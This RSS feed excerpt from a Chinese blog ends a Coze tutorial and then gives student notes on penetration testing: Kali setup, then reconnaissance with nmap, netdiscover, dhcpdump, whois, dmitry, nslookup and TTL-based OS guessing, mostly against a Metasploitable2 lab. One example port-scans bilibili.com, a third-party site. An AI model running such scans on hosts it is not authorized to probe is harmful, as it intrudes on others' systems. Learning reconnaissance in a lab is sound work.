alt="1754642322742.png"><br><br>本小节的一开始，我们提到了自己创建知识库，而<code>知识库写入</code>这个节点，则可以由用户上传文件并生成知识库，辅助用户更精准的了解一些离线信息<br><br><img src="https://free.picui.cn/free/2025/08/08/6895b8ac0f25e.png" alt="1754642619998.png"><br><br>将用户提供的信息（必须要求以文件形式）上传至知识库中</p><h4 id="知识库删除"><a href="#知识库删除" class="headerlink" title="知识库删除"></a>知识库删除</h4><p><img src="https://free.picui.cn/free/2025/08/08/6895b93b2bf1b.png" alt="1754642763470.png"><br><br>若你在一个知识库中上传了多个文件，但此时你想移除某个文件中的内容，可以输入文件对应的编号从而从知识库中移除</p><h4 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896b587aa3ae.png" alt="1754707354124.png"><br><br>该节点的作用：为一个<code>全局变量</code>赋值（全局变量，可以理解为一张公交卡，所有的刷卡机（应用节点）都认识这张卡，但是持卡人（全局变量的赋值）可以更改）</p><h3 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h3><h4 id="图像生成"><a href="#图像生成" class="headerlink" title="图像生成"></a>图像生成</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896b5492999a.png" alt="1754707290860.png"><br><br>打开侧边栏的设置页面，可以配置关于图像生成的一些关键点<br></p><ul><li>模型：不同的特调模型，对各个领域更精准</li><li>比例：最后成品的大小，单位为像素</li><li>质量：数值越大图片越精细，范围[1-40]</li><li>参考图：模型会根据已有的参考图</li><li>提示词<ul><li>正向提示词：用户对画面的要求，依旧可以使用<code>&#123;&#123;输入&#125;&#125;</code>的方式加载用户输入的内容</li><li>反向提示词：使画面减少或不出现一些创作者不想在画面中出现的内容，例如：比例错误，肢体错误……</li></ul></li></ul><h4 id="画板"><a href="#画板" class="headerlink" title="画板"></a>画板</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896b9450612f.png" alt="1754708310996.png"><br><br>开发者可以自定义画板的模板，通过引入不同的数据来更改画板内预设的内容（用得不多）<br><br>详情可以查询这个视频【<a href="https://www.bilibili.com/video/BV1FAcUeFEda/?share_source=copy_web&vd_source=76ef81a3c7f598cf017a43cc75c2cf93">Coze平台实战教程51-工作流画板节点</a>】</p><h4 id="抠图"><a href="#抠图" class="headerlink" title="抠图"></a>抠图</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896baefd7a2b.png" alt="1754708736640.png"><br><br>可以对传入的图片进行抠图处理，最后的输出结果为<code>透明背景图</code>或<code>矢量蒙版图</code></p><h4 id="提示词优化"><a href="#提示词优化" class="headerlink" title="提示词优化"></a>提示词优化</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896bb62b34c4.png" alt="1754708852442.png"><br><br>将用户的提示词进行优化，示例如下：<br></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;prompt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1girl&quot;</span>     <span class="comment">//原始输入</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1girl, best quality, ultra-detailed, masterpiece, realistic photo, happy expression, sunny day, green field, soft lighting, vivid colors&quot;</span><span class="punctuation">,</span>       <span class="comment">//优化后输出</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="画质提升"><a href="#画质提升" class="headerlink" title="画质提升"></a>画质提升</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896bc04b5ca3.png" alt="1754709014256.png"><br><br>画质提升，也就是日常说的<code>超分</code>（超分辨率），旨在提升画面精细度，同时也会使图片的存储体积变大</p><h3 id="音视频处理"><a href="#音视频处理" class="headerlink" title="音视频处理"></a>音视频处理</h3><h4 id="视频生成"><a href="#视频生成" class="headerlink" title="视频生成"></a>视频生成</h4><p>我没VIP啊，这个真教不了:(</p><h4 id="视频提取音频"><a href="#视频提取音频" class="headerlink" title="视频提取音频"></a>视频提取音频</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896bcc2a71f2.png" alt="1754709204554.png"><br><br>就是单纯的把视频里的音频提取出来，单独生成一个文件</p><h4 id="视频抽帧"><a href="#视频抽帧" class="headerlink" title="视频抽帧"></a>视频抽帧</h4><p><img src="https://free.picui.cn/free/2025/08/09/6896be0eeceff.png" alt="1754709537016.png"><br><br>全自动视频抽帧插件</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>希望大家可以在这次训练营中有所收获，并运用到未来的学习生活中！对教程有问题或有别的想问的，可以私信我或在评论区留言，看到会及时回复！</p>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/Coze/">Coze</category>
      
      
      <category domain="https://baiyb.top/tags/Coze/">Coze</category>
      
      <category domain="https://baiyb.top/tags/Agent/">Agent</category>
      
      
      <comments>https://baiyb.top/2025/06/26/Coze/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>渗透测试</title>
      <link>https://baiyb.top/2025/06/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
      <guid>https://baiyb.top/2025/06/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
      <pubDate>Mon, 23 Jun 2025 03:07:23 GMT</pubDate>
      
      <description>小学期の选科(其一)</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="配置kali虚拟机及常用命令的体验"><a href="#配置kali虚拟机及常用命令的体验" class="headerlink" title="配置kali虚拟机及常用命令的体验"></a>配置kali虚拟机及常用命令的体验</h1><p>使用<code>VMware</code>配置kali虚拟机</p><h2 id="下载kali镜像"><a href="#下载kali镜像" class="headerlink" title="下载kali镜像"></a>下载kali镜像</h2><p>从<a href="https://www.kali.org/get-kali/#kali-linux-images">官网</a>下载kali镜像</p><h2 id="安装VMware"><a href="#安装VMware" class="headerlink" title="安装VMware"></a>安装VMware</h2><p>从<a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">官网</a>下载VMware并安装</p><h2 id="熟悉修改文本命令"><a href="#熟悉修改文本命令" class="headerlink" title="熟悉修改文本命令"></a>熟悉修改文本命令</h2><p>kali的内核是Linux，通用Linux的文本修改操作<br><br>Linux中最常用的编辑器是vim，使用语法如下：<br><br></p><h3 id="新建-打开文件："><a href="#新建-打开文件：" class="headerlink" title="新建&#x2F;打开文件："></a>新建&#x2F;打开文件：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 文件名   <span class="comment"># 若文件不存在，则新建；若文件存在，则打开</span></span><br></pre></td></tr></table></figure><h3 id="插入文本（三种模式）："><a href="#插入文本（三种模式）：" class="headerlink" title="插入文本（三种模式）："></a>插入文本（三种模式）：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i   <span class="comment"># 在当前光标前插入</span></span><br><span class="line">a   <span class="comment"># 在当前光标后插入</span></span><br><span class="line">o   <span class="comment"># 新建一行后插入</span></span><br></pre></td></tr></table></figure><h3 id="保存："><a href="#保存：" class="headerlink" title="保存："></a>保存：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:w   <span class="comment"># 保存</span></span><br><span class="line">:x   <span class="comment"># 保存</span></span><br><span class="line">:wq    <span class="comment"># 保存并退出</span></span><br></pre></td></tr></table></figure><h3 id="退出："><a href="#退出：" class="headerlink" title="退出："></a>退出：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:q   <span class="comment"># 退出</span></span><br><span class="line">:q!   <span class="comment"># 强制退出不保存</span></span><br></pre></td></tr></table></figure><h2 id="通过命令行方式管理文件"><a href="#通过命令行方式管理文件" class="headerlink" title="通过命令行方式管理文件"></a>通过命令行方式管理文件</h2><p>查看目录、切换目录、编辑文件</p><h3 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span>      <span class="comment"># 查看当前目录下的文件及文件夹</span></span><br><span class="line"><span class="built_in">ls</span> -l   <span class="comment"># 详细列出当前目录下的文件及文件夹</span></span><br><span class="line"><span class="built_in">ls</span> -a   <span class="comment"># 列出当前目录下的所有文件，包括隐藏文件</span></span><br><span class="line"><span class="built_in">pwd</span>     <span class="comment"># 显示当前所在目录</span></span><br></pre></td></tr></table></figure><h3 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> 目录名   <span class="comment"># 切换到指定目录</span></span><br><span class="line"><span class="built_in">cd</span> ..   <span class="comment"># 切换到上一级目录</span></span><br><span class="line"><span class="built_in">cd</span> ~   <span class="comment"># 切换到家目录</span></span><br></pre></td></tr></table></figure><h3 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 文件名   <span class="comment"># 打开文件</span></span><br></pre></td></tr></table></figure><h2 id="配网"><a href="#配网" class="headerlink" title="配网"></a>配网</h2><p>进入网络配置文件<code>vim/etc/network/interfaces   # 设置ip、掩码、网关</code><br><br>编辑内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address &lt;ip地址&gt;</span><br><span class="line">netmask &lt;子网掩码&gt;</span><br><span class="line">gateway &lt;网关ip&gt;</span><br></pre></td></tr></table></figure><p>进入dns配置文件<code>vim/etc/resolv.conf   # 设置DNS</code><br><br>编辑内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver &lt;网关ip&gt;</span><br><span class="line">nameserver 10.145.214.107</span><br><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure><p>配置好后，进行<code>ping Baidu.com</code><br><br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PING baidu.com (182.61.201.211) 56(84) bytes of data.</span><br><span class="line">64 bytes from 182.61.201.211: icmp_seq=1 ttl=128 <span class="keyword">time</span>=14.8 ms</span><br></pre></td></tr></table></figure><br>出现类似如下结果，说明配网成功</p><h2 id="配置软件源"><a href="#配置软件源" class="headerlink" title="配置软件源"></a>配置软件源</h2><p>由于kali自带的软件源ip多在国外，使用起来速度较慢，因此需要换国内源<br><br>以下是几个国内源：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里云 </span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#清华大学 </span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"></span><br><span class="line"><span class="comment">#腾讯 </span></span><br><span class="line">deb http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>这里以<code>清华源</code>为例：<br><br>第一步：编辑<code>/etc/apt/sources.list</code>文件，将原内容备份并删除<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>第二步：将清华源的内容复制到<code>/etc/apt/sources.list</code>文件中<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>打开<code>/etc/apt/sources.list.tuna</code>文件，将内容复制到<code>/etc/apt/sources.list</code>文件中<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清华大学</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>第三步：更新软件源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>安装中文输入法（fcitx5 + 拼音）<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y fonts-wqy-zenhei fcitx5 fcitx5-pinyin fcitx5-configtool</span><br></pre></td></tr></table></figure><ul><li>fonts-wqy-zenhei：文泉驿字体，中文显示更清晰</li><li>fcitx5：输入法框架</li><li>fcitx5-pinyin：拼音输入法引擎</li><li>fcitx5-configtool：配置工具</li></ul><p>配置环境变量 <code>etc/bash.bashrc</code>文件（全体用户生效）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx </span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx </span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">&quot;@im=fcitx&quot;</span></span><br></pre></td></tr></table></figure><p>打开fcitx5 配置页面，添加pinyin<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcitx5-configtool</span><br></pre></td></tr></table></figure><p><img src="https://free.picui.cn/free/2025/06/23/6858e2511ba9d.png" alt="配置输入法"><br>勾选pinyin输入法，ctrl+空格切换</p><h1 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h1><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><h3 id="ip地址规则"><a href="#ip地址规则" class="headerlink" title="ip地址规则"></a>ip地址规则<br></h3><p>Netmask工具可以确定IP范围对应的子网掩码格式。<br><br>格式：<code>netmask -c 起始ip:终止ip</code><br></p><p>假如输入为<code>netmask -c 192.168.1.0:192.168.1.255</code>，意思是将从<code>192.168.1.0</code>到<code>192.168.1.255</code>的ip范围转换为<code>CIDR</code>形式<br></p><p>输出为：<code>192.168.1.0/24</code><br><br><br><img src="https://free.picui.cn/free/2025/06/24/6859f35bbb58a.png" alt="netmask -c"></p><h3 id="确定网络拓扑"><a href="#确定网络拓扑" class="headerlink" title="确定网络拓扑"></a>确定网络拓扑</h3><p>Traceroute工具确定网络拓扑结构，可以确定是外网还是局域网。<br><br>格式：<code>traceroute ip地址/域名</code><br><br>目的是通过转跳服务器判断目的地是否在内网，若不是外网，则为局域网。<br></p><p>假设输入的为<code>traceroute www.baidu.com</code>，意思是将本机到<code>www.baidu.com</code>的服务器转跳信息显示出来<br></p><p>Linux默认使用<code>UDP traceroute</code>，但在校园网环境中可能被拦截，导致一跳后都显示为超时符<code>*</code><br><br><img src="https://free.picui.cn/free/2025/06/24/6859f66c03aa5.png" alt="udp"><br></p><p>此时我们可以使用<code>TCP traceroute</code>即可正常运行<br><br>命令为<code>traceroute -T www.baidu.com</code>，<code>-T</code>参数表示使用<code>TCP</code>协议<br><br><img src="https://free.picui.cn/free/2025/06/24/6859f6c9a1cc5.png" alt="tcp"><br></p><h2 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h2><h3 id="使用Nmap工具"><a href="#使用Nmap工具" class="headerlink" title="使用Nmap工具"></a>使用Nmap工具<br></h3><ul><li>探测存活主机</li><li>扫描端口</li><li>探测主机操作系统信息</li></ul><h3 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h3><p>格式：<code>nmap -sn 目标ip范围</code></p><ul><li><code>-sn</code>参数表示只进行主机发现，不进行端口扫描</li><li><code>目标ip范围</code>表示要扫描的ip范围，格式为<code>起始ip-终止ip</code>，例如<code>192.168.1.0-192.168.1.255</code></li><li>扫描结果中<code>UP</code>的主机表示该主机处于开机状态，<code>DOWN</code>的主机表示该主机处于关机状态或无法访问</li></ul><p>此处，扫描<code>61.139.2.0/24</code>上的设备，显示如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/6859f973b8e0d.png" alt="nmap -sn"><br><br>可以看到以下ip处于开机状态：<br></p><ul><li>61.139.2.1</li><li>61.139.2.2</li><li>61.139.2.133</li><li>61.139.2.254</li><li>61.139.2.131</li></ul><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>格式：<code>nmap -p 端口范围 目标ip</code></p><ul><li><code>-p</code>参数表示要扫描的端口范围</li><li><code>端口范围</code>表示要扫描的端口范围，格式为<code>起始端口-终止端口</code>，例如<code>1-100</code></li><li><code>目标ip</code>表示要扫描的目标ip地址</li><li>扫描结果中<code>open</code>的端口表示该端口处于开启状态，<code>closed</code>的端口表示该端口处于关闭状态</li></ul><p>此处，扫描<code>bilibili.com</code>的前443个端口，显示如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/6859fc2f5e8ce.png" alt="nmap -p"><br><br>可以看到以下端口开放：<br></p><ul><li>25(tcp)：smtp服务</li><li>80(tcp)：http服务</li><li>110(tcp)：pop3服务</li><li>443(tcp)：https服务</li></ul><h3 id="探测主机操作系统信息"><a href="#探测主机操作系统信息" class="headerlink" title="探测主机操作系统信息"></a>探测主机操作系统信息</h3><p>格式：<code>nmap -O 目标ip</code></p><ul><li><code>-O</code>参数表示要探测主机操作系统信息</li><li><code>目标ip</code>表示要扫描的目标ip地址</li><li>扫描结果中<code>OS</code>的信息表示该主机的操作系统信息</li></ul><p>此处扫描Metasploitable2的ip：<code>61.139.2.133</code>的操作系统信息，显示如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/6859ff24f38cf.png" alt="nmap -O"><br><br>可以看到<code>61.139.2.133</code>的操作系统为<code>Linux 2.6.x</code></p><h3 id="使用Netdiscover工具实施ARP主动扫描。"><a href="#使用Netdiscover工具实施ARP主动扫描。" class="headerlink" title="使用Netdiscover工具实施ARP主动扫描。"></a>使用Netdiscover工具实施ARP主动扫描。</h3><p>格式：<code>netdiscover -r ip范围</code><br><br><code>ip范围</code>表示要扫描的ip范围<br></p><ul><li>格式为<code>起始ip-终止ip</code>例如<code>192.168.1.0-192.168.1.255</code></li><li>或使用<code>CIDR</code>形式，例如<code>192.168.1.0/24</code></li></ul><p>扫描之间的ip段<code>61.139.2.0/24</code>，结果如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a0180dc08d.png" alt="netdiscover -r"><br><br>扫描出以下在线ip地址：<br></p><ul><li>61.139.2.1</li><li>61.139.2.2</li><li>61.139.2.133</li><li>61.139.2.254</li></ul><h2 id="监听发现主机"><a href="#监听发现主机" class="headerlink" title="监听发现主机"></a>监听发现主机</h2><h3 id="使用Netdiscover工具的被动模式实施ARP监听。"><a href="#使用Netdiscover工具的被动模式实施ARP监听。" class="headerlink" title="使用Netdiscover工具的被动模式实施ARP监听。"></a>使用Netdiscover工具的被动模式实施ARP监听。<br></h3><p>上文阐述的<code>使用Netdiscover工具实施ARP主动扫描</code>，本质上是对服务器发起主动请求，若目标主机在线则会返回响应信息。<br><br>而<code>Netdiscover</code>工具的被动模式则是仅监听其他主机在局域网中的 ARP 广播流量，不发送任何数据包<br><br>格式：<code>netdiscover -p</code><br><br>直接监听，结果如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a046cdb880.png" alt="netdiscover -p"><br><br>此时只需要等待网络中的主机在局域网中的 ARP 广播流量即可<br><br><img src="https://free.picui.cn/free/2025/06/24/685a04f64d41d.png" alt="netdiscover -p"><br></p><h3 id="了解DHCP的主要作用，并实施DHCP监听来发现主机。"><a href="#了解DHCP的主要作用，并实施DHCP监听来发现主机。" class="headerlink" title="了解DHCP的主要作用，并实施DHCP监听来发现主机。"></a>了解DHCP的主要作用，并实施DHCP监听来发现主机。<br></h3><p>这也是个被动检测的过程，当有主机申请IP地址时，DHCP服务器会向局域网中的所有主机发送通知，通知其他主机有新的主机加入网络。<br><br>语法：<code>dhcpdump -i eth0</code><br><br>检测<code>eth0</code>网络端口上的DHCP流量<br><br><img src="https://free.picui.cn/free/2025/06/24/685a05f3097c1.png" alt="dhcpdump -i eth0"><br><br>接下来就是漫长的等待，直至有主机申请IP地址<br><br><img src="https://free.picui.cn/free/2025/06/24/685a0c9818f3b.png" alt="dhcpdump -i eth0"><br><br>被动检测到了主机<code>61.139.2.133</code>的IP地址</p><h2 id="域名信息分析"><a href="#域名信息分析" class="headerlink" title="域名信息分析"></a>域名信息分析</h2><h3 id="使用whois工具查询域名相关信息。"><a href="#使用whois工具查询域名相关信息。" class="headerlink" title="使用whois工具查询域名相关信息。"></a>使用whois工具查询域名相关信息。<br></h3><p>语法：<code>whois example.com</code><br><br>这里对我自己的域名<code>baiyb.top</code>进行whois查询：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a081cdb992.png" alt="whois"><br><br>可以得到以下信息：<br></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td><strong>Domain Name</strong></td><td>域名名称：<code>baiyb.top</code></td></tr><tr><td><strong>Creation Date</strong></td><td>注册时间：2022 年 8 月 8 日</td></tr><tr><td><strong>Registry Expiry Date</strong></td><td>到期时间：2032 年 8 月 8 日（注册了10年）</td></tr><tr><td><strong>Registrar</strong></td><td>注册商：阿里云 Alibaba Cloud Computing Ltd. (Net.cn)</td></tr><tr><td><strong>Registrar WHOIS Server</strong></td><td>查询WHOIS信息的服务器：<code>whois.aliyun.com</code></td></tr></tbody></table><table><thead><tr><th>信息类型</th><th>内容</th></tr></thead><tbody><tr><td>域名</td><td><code>baiyb.top</code></td></tr><tr><td>注册时间</td><td>2022-08-08</td></tr><tr><td>到期时间</td><td>2032-08-08</td></tr><tr><td>注册商</td><td>阿里云</td></tr><tr><td>DNS 服务商</td><td>HiChina（阿里）</td></tr><tr><td>注册人信息</td><td>开启了隐私保护，看不到真实姓名、邮箱等</td></tr></tbody></table><h3 id="使用dmitry工具查询域名的子域名（需要vpn）。"><a href="#使用dmitry工具查询域名的子域名（需要vpn）。" class="headerlink" title="使用dmitry工具查询域名的子域名（需要vpn）。"></a>使用dmitry工具查询域名的子域名（需要vpn）。<br></h3><p>语法：<code>dmitry -d 域名</code><br><br>检查我的域名下是否有子域名：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a0dcc4698f.png" alt="dmitry -d"><br><br>由于查询需要vpn，所以Google的链接error</p><h3 id="使用nslookup工具进行域名解析。"><a href="#使用nslookup工具进行域名解析。" class="headerlink" title="使用nslookup工具进行域名解析。"></a>使用nslookup工具进行域名解析。<br></h3><p>nslookup 是一个 DNS 查询工具，用于：<br></p><ul><li>查看域名对应的 IP 地址</li><li>查询指定 DNS 服务器返回的解析结果</li><li>查看子域名是否存在</li></ul><p>语法：<code>nslookup 域名</code><br><br>依旧查看我的子域名<code>blogchat.baiyb.top（博客评论区）</code>是否存在：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a0f5eaa90a.png" alt="nslookup"><br><br><code>blogchat.baiyb.top canonical name = cname.vercel-dns.com.</code>表示 blogchat.baiyb.top 实际是 一个 CNAME（别名）记录，它指向 cname.vercel-dns.com<br><br>也就是说：✅<code>blogchat.baiyb.top</code> ≈ <code>cname.vercel-dns.com</code><br><br>意味着网站是托管在 Vercel 平台上的（确实）<br></p><h3 id="使用ping命令探测域名。"><a href="#使用ping命令探测域名。" class="headerlink" title="使用ping命令探测域名。"></a>使用ping命令探测域名。<br></h3><p>语法：<code>ping 域名/ip地址</code><br>ping命令用于测试与目标主机的连通性，即检查目标主机是否可达。<br><br><img src="https://free.picui.cn/free/2025/06/24/685a10c34bbe2.png" alt="ping"><br><br>出现延迟、解析域名，说明可以联通我的博客<br></p><h2 id="扫描端口-1"><a href="#扫描端口-1" class="headerlink" title="扫描端口"></a>扫描端口</h2><h3 id="了解端口的作用、定义、分类以及常见的端口及用途。"><a href="#了解端口的作用、定义、分类以及常见的端口及用途。" class="headerlink" title="了解端口的作用、定义、分类以及常见的端口及用途。"></a>了解端口的作用、定义、分类以及常见的端口及用途。<br></h3><p>端口（Port）是指计算机网络中，用来区分不同服务和进程的逻辑接口。它配合 IP 地址使用，用于唯一标识一台主机上的某个服务。<br><br>每个端口都是一个 16 位的数字，范围是<code>0 - 65535</code><br><br>它不是物理设备，而是操作系统中管理网络连接的一个标识<br><br>📦 举例：<br></p><ul><li>IP 地址：192.168.1.100</li><li>端口号：80</li><li>合起来：192.168.1.100:80 表示这台主机上的网页服务</li></ul><p>🧭 端口的作用<br><br>端口的主要作用是：</p><ul><li>区分不同的服务：例如 <code>HTTP</code> 用 <code>80</code>，<code>SSH</code> 用 <code>22</code>，<code>FTP</code> 用 <code>21</code></li><li>多服务共存：一台服务器可以运行多个服务，通过不同端口访问</li><li>通信识别标识：用于 <code>TCP/IP</code> 协议通信中，确认数据该发给哪个进程</li></ul><table><thead><tr><th>类型</th><th>范围</th><th>描述</th></tr></thead><tbody><tr><td><strong>知名端口（Well-known ports）</strong></td><td>0 - 1023</td><td>被系统或知名服务预留，如 HTTP、FTP、SSH 等</td></tr><tr><td><strong>注册端口（Registered ports）</strong></td><td>1024 - 49151</td><td>给用户程序或第三方应用使用</td></tr><tr><td><strong>动态&#x2F;私有端口（Dynamic&#x2F;Private ports）</strong></td><td>49152 - 65535</td><td>系统动态分配用于客户端临时通信</td></tr></tbody></table><h3 id="使用nmap对部署的靶机进行端口扫描。"><a href="#使用nmap对部署的靶机进行端口扫描。" class="headerlink" title="使用nmap对部署的靶机进行端口扫描。"></a>使用nmap对部署的靶机进行端口扫描。<br></h3><p>语法：<code>nmap ip地址/域名</code><br><br>此处扫描Metasploitable2的ip：<code>61.139.2.133</code>的操作系统信息，显示如下：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a13aaabf34.png" alt="nmap"><br><br>可以看到<code>61.139.2.133</code>的开放端口</p><h2 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h2><h3 id="使用Ping命令测试物理机和靶机的操作系统。"><a href="#使用Ping命令测试物理机和靶机的操作系统。" class="headerlink" title="使用Ping命令测试物理机和靶机的操作系统。"></a>使用Ping命令测试物理机和靶机的操作系统。<br></h3><p>使用 <code>ping 命令</code> 无法直接判断操作系统类型，但可以通过它配合一些分析手段（如 TTL 值）初步猜测目标主机的操作系统。<br></p><table><thead><tr><th>TTL 值范围（默认）</th><th>操作系统类型（可能）</th></tr></thead><tbody><tr><td><strong>Windows</strong></td><td>128（常见）、127-120</td></tr><tr><td><strong>Linux&#x2F;Unix</strong></td><td>64（常见）、63-60</td></tr><tr><td><strong>Cisco&#x2F;网络设备</strong></td><td>255、254 等</td></tr></tbody></table><p>现在分别对靶机(Linux)<code>61.139.2.133</code>和物理机(Windows)<code>61.139.2.1</code>使用<code>ping</code>命令进行测试：<br><br><img src="https://free.picui.cn/free/2025/06/24/685a150f033f2.png" 